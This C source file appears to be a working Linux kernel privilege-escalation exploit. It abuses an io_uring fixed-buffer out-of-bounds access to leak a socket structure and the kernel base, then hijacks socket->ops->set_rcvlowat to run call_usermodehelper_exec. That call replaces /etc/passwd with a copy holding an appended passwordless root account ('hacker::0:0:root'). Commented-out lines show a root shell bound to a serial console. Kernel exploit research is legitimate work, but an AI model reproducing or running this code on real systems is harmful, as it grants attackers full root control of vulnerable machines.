#define _GNU_SOURCE 
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <liburing.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>

#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#pragma pack(16)

#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_DEFAULT "\033[0m"
#define showAddr(var)  dprintf(2, COLOR_GREEN "[*] %s -> %p\n" COLOR_DEFAULT, #var, var); 
#define logu(fmt, ...) dprintf(2,  "[*]  " fmt "\n" , ##__VA_ARGS__)
#define logd(fmt, ...) dprintf(2, COLOR_BLUE "[*] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
#define debug(fmt, ...)                      \
    do {                                     \
        loge(fmt, ##__VA_ARGS__);            \
        loge("debug at line %d", __LINE__);  \
        getchar();                           \
    } while (0)

#define __ALIGN_MASK(x,mask)    (((x)+(mask))&~(mask))
#define ALIGN(x,a)              __ALIGN_MASK(x,(typeof(x))(a)-1)
#define L1_CACHE_SHIFT 6
#define sk_buff_size 224
#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))

size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_direct_base=0xffff888000000000;
size_t commit_creds = 0,prepare_kernel_cred = 0;
size_t vmlinux_base = 0;
size_t swapgs_restore_regs_and_return_to_usermode=0;
size_t user_cs, user_ss, user_rflags, user_sp;
size_t init_cred=0;
size_t __ksymtab_commit_creds=0,__ksymtab_prepare_kernel_cred=0;

void bind_cpu(int core);
void binary_dump(char *desc, void *addr, int len);

#define PAGE_SIZE 0x1000  
#define SOCKET_TAG  0xdeadbeefdeadbeef
#define VIR_START_ADDR 0xaabbcc0000
#define FIX_ADD_FD 0x20000
#define FAILED ((void*)-1)
#define SET_RCVBUF(x) ((FIX_ADD_FD+x))
#define GET_RCVBUF(x) ((x/2)-FIX_ADD_FD)
#define SUBMIT_READ 0
#define SUBMIT_WRITE 1
void prep_rlimit(int *nr_memfds,int *nr_sockets){
    struct rlimit max_file;

    getrlimit(RLIMIT_NOFILE,&max_file);
    logu("rlim_cur -> %d rlim_max -> %d",max_file.rlim_cur,max_file.rlim_max);
    max_file.rlim_cur=max_file.rlim_max;
    setrlimit(RLIMIT_NOFILE,&max_file);

    int limit = max_file.rlim_max/4;
    *nr_memfds = limit/2;
    *nr_sockets= limit - *nr_memfds;
    logu("nr_memfds -> %d nr_sockets -> %d",*nr_memfds,*nr_sockets);
}
int setup_memfd_physics(char* name,int real_size){
    int fd = memfd_create(name,MFD_CLOEXEC);
    fallocate(fd,0,0,PAGE_SIZE*real_size);
    return fd;
}
int setup_socket(uint64_t TAG){
    int fd;
    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        die("socket creating failed");
    // 设置 sk_pacing_rate / sk_max_pacing_rate , 便于找到本sock
    if (setsockopt(fd, SOL_SOCKET, SO_MAX_PACING_RATE, &TAG, sizeof(uint64_t)) < 0) 	
        die("setting pacing rate failed");
    // sk->sk_rcvbuf = ((0x20000+fd)*2)
    int rcvbuf = SET_RCVBUF(fd);
    if (setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(int)) < 0) 	
        die("failed to set SO_SNDBUF");
    return fd;
}
int leak_sock_addr(void* addr,uint64_t size){
    int  ret = -1;
    uint64_t* tmp = (uint64_t* )addr;
    for (size_t i = 0; i < size/8; i++)
    {
        // if( tmp[i] != 0)
        //     logi(" addr: %p offset: 0x%llx -> %p",addr+i,i,tmp[i]);
        if(tmp[i]==SOCKET_TAG){
            logw("successful!! addr: %p offset: 0x%llx -> %p",addr+i*8,i*8,tmp[i]);
            if(ret == FAILED && tmp[i+1]==SOCKET_TAG) 
                ret = i*8 -472 + 0x10 ;
        }     
    }
    return ret;  
}
void memfds_bind_virtual(int fd, int size){
    for (size_t i = 0; i < size; i++)
    {
        if( mmap(VIR_START_ADDR+i*PAGE_SIZE , PAGE_SIZE,PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_FIXED,fd,0 )==MAP_FAILED )
                       die("failed mmap memfds_buf");
    }
}
void submit_sqe(struct io_uring* ring,int fd,void* buf, unsigned int size,int FLAGS){
    struct io_uring_sqe * sqe;
    struct io_uring_cqe* cqe;
    int ret;
    sqe = io_uring_get_sqe(ring);
    switch (FLAGS)
    {
    case SUBMIT_WRITE:
        io_uring_prep_write_fixed(sqe,fd,buf,size,0,0);
        break;
    case SUBMIT_READ:
        io_uring_prep_read_fixed(sqe,fd,buf,size,0,0);
        break;
    default:
        return;
    }
    ret = io_uring_submit(ring);
    if (ret < 0) {
        die("failed io_uring_submit");
    }
    io_uring_wait_cqe(ring,&cqe);
    io_uring_cqe_seen(ring,cqe);
}
void prep_file(){

    FILE *sourceFile, *destFile;
    char buffer[256];

    sourceFile = fopen("/etc/passwd", "r");
    if (sourceFile == NULL) {
        die("open failed");
    }
    destFile = fopen("/home/mowen/passwd", "w");
    if (destFile == NULL) {
        die("open failed");
    }
    while (fgets(buffer, sizeof(buffer), sourceFile) != NULL) {
        fputs(buffer, destFile);
    }

    fprintf(destFile, "hacker::0:0:root:/root:/bin/sh\n");

    fclose(sourceFile);
    fclose(destFile);
    logu("prep_file");
}
int main(void){
#define SOCK_DEF_READALBE_OFFSET 0xcf7540
#define CALL_USERMODEHELPER_EXEC_WORK_OFFSET 0xfe610
#define CALL_USERMODEHELPER_EXEC_OFFSET 0xfe080
#define call_usermodehelper_exec_async_offset 0xfe4a0
    int ret,nr_memfds,nr_sockets,tmp;
    int *memfds,*sockets;
    int recv_fd,recv_fd2,block_size;
    void* recv_buf,*recv_buf2;
    int nr_pages;
    void* oob_buf ;
    struct io_uring ring;
    struct iovec uiovec;
    struct io_uring_cqe* cqe;
    struct io_uring_sqe* sqe;
    BLUE;puts("[*]start");CLOSE;
    prep_file();
    bind_cpu(0);
// 1、解除当前进程限制
    prep_rlimit(&nr_memfds,&nr_sockets);
// 2、初始化 io_uring、共享空间
    logu("io_uring_queue_init");
    io_uring_queue_init(4,&ring,0);

    memfds = malloc(sizeof(*memfds)*nr_memfds);
    sockets = malloc(sizeof(*sockets)*nr_sockets);
    logu("init memfds && sockets");
    for (size_t i = 0,tmp=0; i < nr_memfds; i++)
    {
        memfds[i]=setup_memfd_physics("mowen_fd",1);
        if(i < nr_sockets) {
            sockets[i] = setup_socket(SOCKET_TAG);
            tmp++;
        }
    }
    nr_sockets = tmp;
    nr_pages = 65000;
    
    logu("init recv_buf");
    block_size = 0x100;
    recv_fd=setup_memfd_physics("recv_fd",block_size);
    recv_buf = mmap(0,block_size*PAGE_SIZE,PROT_WRITE|PROT_READ,
                        MAP_SHARED,recv_fd,0);
    recv_fd2=setup_memfd_physics("recv_fd2",block_size);
    recv_buf2 = mmap(0,0x5000,PROT_WRITE|PROT_READ,
                        MAP_SHARED,recv_fd,0);                    
    if(recv_buf==MAP_FAILED || recv_buf2==MAP_FAILED)
            die("failed mmap recv_buf"); 
    logi("recv_buf -> %p",recv_buf);

    for (size_t i = 0; i < nr_pages; i++)
    {
// 3、注册 fixed buf
        logu("memfds bind virtual");
        memfds_bind_virtual(memfds[i],nr_pages);
        oob_buf = VIR_START_ADDR;
        uiovec.iov_base = oob_buf;
        uiovec.iov_len =  nr_pages* PAGE_SIZE;
        logi("io_uring_register_buffers");

        ret = io_uring_register_buffers(&ring,&uiovec,1);
        if( ret < 0 )die("failed io_uring_register_buffers");
        logd("uiovec.iov_base -> %p uiovec.iov_len -> %llx",uiovec.iov_base,uiovec.iov_len);      
// 4、尝试oob
        for (size_t vir_off = 0; vir_off < (nr_pages-block_size); vir_off+=block_size)
        {
            void* oob_addr = uiovec.iov_base+vir_off*PAGE_SIZE;
            submit_sqe(&ring,recv_fd,oob_addr,block_size,SUBMIT_WRITE);
            // binary_dump("recv_buf",recv_buf,block_size*PAGE_SIZE);
            ret= leak_sock_addr(recv_buf,block_size*PAGE_SIZE);
            if (ret==-1) continue;
    // oob读取成功，开始提取信息
            logu("oob_addr -> %p offset -> %p",oob_addr,vir_off*PAGE_SIZE);
            void* sock_addr = oob_addr+ret;
            logi("offset : %d v2p_sock_addr : %p",ret,sock_addr);
    //定位到物理地址处，读取出完整sock
            submit_sqe(&ring,recv_fd,sock_addr,0x2000,SUBMIT_WRITE);
            memcpy(recv_buf2,recv_buf,0x2000);
    //现在recv_buf 包含完整的sock结构体

            void* sock  = (void*)recv_buf;
            logu("sock->sk_pacing_rate : 0x%llx",*(size_t*)(sock+456));    
            logu("sock->sk_max_pacing_rate : 0x%llx",*(size_t*)(sock+456+8));   
            int rcvbuf = *(int*)(sock+280);
            int sock_fd = GET_RCVBUF(rcvbuf);
            logu("sock->rcvbuf : 0x%x  sock_fd -> %d",rcvbuf,sock_fd);   
            
            uint64_t sock_def_readable = *(uint64_t*)(sock+0x2a8);
            vmlinux_base = sock_def_readable - SOCK_DEF_READALBE_OFFSET;
            showAddr(vmlinux_base); 

            uint64_t slub_sock_addr = *(uint64_t*)(sock+0xd8);
            slub_sock_addr -= 0xd8;
            showAddr(slub_sock_addr); 
    // 先在sock上布置所需的字符串
            // char cmd_argv[] = {"/bin/sh", "-c","/bin/sh &>/dev/ttyS0 </dev/ttyS0", NULL};  
            // char cmd_argv[] = "/bin/sh\x00-c\x00/bin/sh &>/dev/ttyS0 </dev/ttyS0\x00";
            // echo "hacker::0:0:root:/root:/bin/sh" >> /etc/passwd
            char cmd_argv[] = "/usr/bin/mv\x00-f\x00/home/mowen/passwd\x00/etc/passwd\x00";
            uint64_t path_addr =slub_sock_addr;
            uint64_t argv_addr =slub_sock_addr;
#define sk_priority_offset 0x1c0-0x20
#define sk_error_queue_offset 0xc0-0x10
#define sk_sk_socket_offset 0x270
#define socket_ops_offset 0x20
#define ops_set_rcvlowat_offset 0xe0
#define arg1_offset 11+1
#define arg2_offset arg1_offset+2+1
#define arg3_offset arg2_offset+18+1
#define kernel_execve  0x443470
            pid_t pid;
            pid=fork();
            if (!pid)
            {
                memcpy(recv_buf+sk_priority_offset,cmd_argv,80);
                uint64_t* sk_error_queue_addr = (uint64_t*)(recv_buf+sk_error_queue_offset);
                sk_error_queue_addr[0] = slub_sock_addr+sk_priority_offset;
                sk_error_queue_addr[1] = slub_sock_addr+sk_priority_offset+arg1_offset;
                sk_error_queue_addr[2] = slub_sock_addr+sk_priority_offset+arg2_offset;
                sk_error_queue_addr[3] = slub_sock_addr+sk_priority_offset+arg3_offset;
                sk_error_queue_addr[4] = 0;
        // 篡改 socket -> ops ->set_rcvlowat == call_usermodehelper_exec 
        // ops + 0x20 = set_rcvlowat
                *(uint64_t*)(recv_buf+sk_sk_socket_offset) = slub_sock_addr+sk_sk_socket_offset;
                *(uint64_t*)(recv_buf+sk_sk_socket_offset+socket_ops_offset) = slub_sock_addr;
                *(uint64_t*)(recv_buf+ops_set_rcvlowat_offset) = vmlinux_base + CALL_USERMODEHELPER_EXEC_OFFSET;
        //伪造 subprocess_info                
                uint64_t subprocess_info[11];
                memset(subprocess_info,0,sizeof(subprocess_info));
                subprocess_info[0] == 0x80; 
                subprocess_info[1] == slub_sock_addr + 8; 				    // work_struct.entry.next 
                subprocess_info[2] == slub_sock_addr + 8;				    // work_struct.entry.prev 
                subprocess_info[3] = vmlinux_base+CALL_USERMODEHELPER_EXEC_WORK_OFFSET;	    // func ==call_usermodehelper_exec_work
                subprocess_info[5] = slub_sock_addr+sk_priority_offset;	    // path_string_addr
                subprocess_info[6] = slub_sock_addr+sk_error_queue_offset; 	// argv_strings_addr
                memcpy(recv_buf,subprocess_info,sizeof(subprocess_info));
                submit_sqe(&ring,recv_fd,sock_addr,0x2000,SUBMIT_READ);
                logu("call_usermodehelper_exec fake done");
                int val = 0;
                setsockopt(sock_fd, SOL_SOCKET, SO_RCVLOWAT, &val, sizeof(val));
                logu("child done");
            }
            logu("father start");
            // waitpid(pid,0,0);
            sleep(5);
            submit_sqe(&ring,recv_fd2,sock_addr,0x2000,SUBMIT_READ);
            debug("debug oob_addr(%p)",oob_addr);
            logu("father done");
            // sleep(10);
            exit(-1);
        }

        io_uring_unregister_buffers(&ring);
        munmap(oob_buf,nr_pages* PAGE_SIZE);
    }
    
    munmap(recv_buf,block_size*PAGE_SIZE);
    close(recv_fd);
    for (size_t i = 0; i < nr_memfds ; i++)
    {
        close(sockets[i]);
        close(memfds[i]);
    }
    
    
    BLUE;puts("[*]end");CLOSE;
    return 0;
}
/*
    p ((struct sock*)0x7fcc711b0000).sk_pacing_rate
    p ((struct sock*)0xffff88810550bf00).sk_priority
    p *((struct sock*)0xffff888106cb3f00)
    p &((struct sock*)0xffff888109e7bf00).ns_tracker

    p *((struct sock*)0xffff88810746bf00).sk_socket

    p *((struct subprocess_info *)0xffff888106cb3f00)
    
0xffff888109e7c800
*/


void binary_dump(char *desc, void *addr, int len) {
    _QWORD *buf64 = (_QWORD *) addr;
    _BYTE *buf8 = (_BYTE *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}


void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    BLUE;printf("[*] bind_cpu(%d)",core);CLOSE;
}




